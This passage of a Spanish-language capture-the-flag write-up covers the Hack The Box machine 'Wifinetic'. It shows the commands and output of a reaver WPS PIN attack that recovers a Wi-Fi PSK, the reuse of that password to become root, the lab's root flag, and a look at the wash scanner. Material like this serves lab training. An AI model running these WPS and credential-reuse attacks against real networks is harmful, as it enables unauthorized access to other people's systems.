Vamos a indicarle la dirección, el canal y la interfaz y rápidamente nos da el **PSK** <https://github.com/t6x/reaver-wps-fork-t6x>

```bash
netadmin@wifinetic:~$ reaver -i mon0 -b 02:00:00:00:00:00 -vv -c 1

Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Switching mon0 to channel 1
[+] Waiting for beacon from 02:00:00:00:00:00
[+] Received beacon from 02:00:00:00:00:00
[+] Trying pin "12345670"
[+] Sending authentication request
[!] Found packet with bad FCS, skipping...
[+] Sending association request
[+] Associated with 02:00:00:00:00:00 (ESSID: OpenWrt)
[+] Sending EAPOL START request
[+] Received identity request
[+] Sending identity response
[+] Received M1 message
[+] Sending M2 message
[+] Received M3 message
[+] Sending M4 message
[+] Received M5 message
[+] Sending M6 message
[+] Received M7 message
[+] Sending WSC NACK
[+] Sending WSC NACK
[+] Pin cracked in 2 seconds
[+] WPS PIN: '12345670'
[+] WPA PSK: 'WhatIsRealAnDWhAtIsNot51121!'
[+] AP SSID: 'OpenWrt'
[+] Nothing done, nothing to save.
netadmin@wifinetic:~$ 
```

## Shell as root

Ahora que tenemos la **password** si vemos si **root** la utiliza funciona

```bash
netadmin@wifinetic:~$ su root
Password: 
root@wifinetic:/home/netadmin# whoami
root
root@wifinetic:/home/netadmin# id
uid=0(root) gid=0(root) groups=0(root)
root@wifinetic:/home/netadmin# 
```

## Root.txt 

Aquí podemos ver la **root.txt**

```bash
root@wifinetic:~# cat root.txt 
e77ba309f7448f83ee963cf7dfc1f809
root@wifinetic:~# 
```

## Extra 

Como para mi es nueva la herramienta `reaver` `wash` es una herramienta que forma parte de `reaver` y funciona para obtener **BSSIDs** emitiendo un **probe request** que es un paquete para descubrir redes disponibles y obtener información de ella pero requiere de una **capability** que es esta `CAP_NET_RAW` como estamos como **root** podemos utilizarla 

```bash
root@wifinetic:~# wash -h

Wash v1.6.5 WiFi Protected Setup Scan Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner

Required Arguments:
	-i, --interface=<iface>              Interface to capture packets on
	-f, --file [FILE1 FILE2 FILE3 ...]   Read packets from capture files

Optional Arguments:
	-c, --channel=<num>                  Channel to listen on [auto]
	-n, --probes=<num>                   Maximum number of probes to send to each AP in scan mode [15]
	-F, --ignore-fcs                     Ignore frame checksum errors
	-2, --2ghz                           Use 2.4GHz 802.11 channels
	-5, --5ghz                           Use 5GHz 802.11 channels
	-s, --scan                           Use scan mode
	-u, --survey                         Use survey mode [default]
	-a, --all                            Show all APs, even those without WPS
	-j, --json                           print extended WPS info as json
	-U, --utf8                           Show UTF8 ESSID (does not sanitize ESSID, dangerous)
	-h, --help                           Show help

Example:
	wash -i wlan0mon

root@wifinetic:~# 
```

Si le pasamos las interfaces vemos que obtenemos información sobre el **AP**

```bash
root@wifinetic:~# wash -i wlan2
BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
--------------------------------------------------------------------------------
02:00:00:00:00:00    1  -30  2.0  No             OpenWrt
^C
root@wifinetic:~# 
```

## Flagspwn

He desarrollado este pequeño script para mostrar rapidamente las flags en python3 te dejo el link aqui <https://github.com/MikeRega7/Scripts/tree/main/HackTheBox/Wifinetick>
